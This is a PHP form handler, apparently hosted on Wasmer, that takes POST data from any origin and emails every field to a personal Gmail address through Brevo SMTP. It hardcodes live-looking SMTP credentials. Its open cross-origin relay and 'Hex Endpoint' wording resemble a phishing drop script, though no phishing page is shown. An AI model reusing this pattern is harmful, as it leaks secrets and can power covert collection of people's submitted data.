<?php
// Wasmer par maujood send_logic.php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $mail = new PHPMailer(true);

    try {
        // Brevo SMTP Settings
        $mail->isSMTP();
        $mail->Host       = 'smtp-relay.brevo.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'b155e8001@smtp-brevo.com'; 
        $mail->Password   = 'bsklCWVj4aYGXhG'; 
        $mail->Port       = 587;
        $mail->SMTPSecure = 'tls'; 

        // Sender & Receiver
        $mail->setFrom('arzajejo@arzajejo.xyz', 'Arzajejo Form');
        $mail->addAddress('alibrohi883@gmail.com'); 

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'New Form Submission via Hex Endpoint';
        
        // Data build karna
        $message_body = "<h3>New Form Data Received:</h3>";
        if (!empty($_POST)) {
            foreach ($_POST as $key => $value) {
                $message_body .= "<b>" . ucfirst($key) . ":</b> " . htmlspecialchars($value) . "<br>";
            }
        } else {
            $message_body .= "No data fields captured. Check JavaScript payload.";
        }

        $mail->Body = $message_body;

        $mail->send();
        echo "success"; // JavaScript ko success response milega
    } catch (Exception $e) {
        echo "Mailer Error: " . $mail->ErrorInfo;
    }
} else {
    echo "Direct access not allowed.";
}
?>
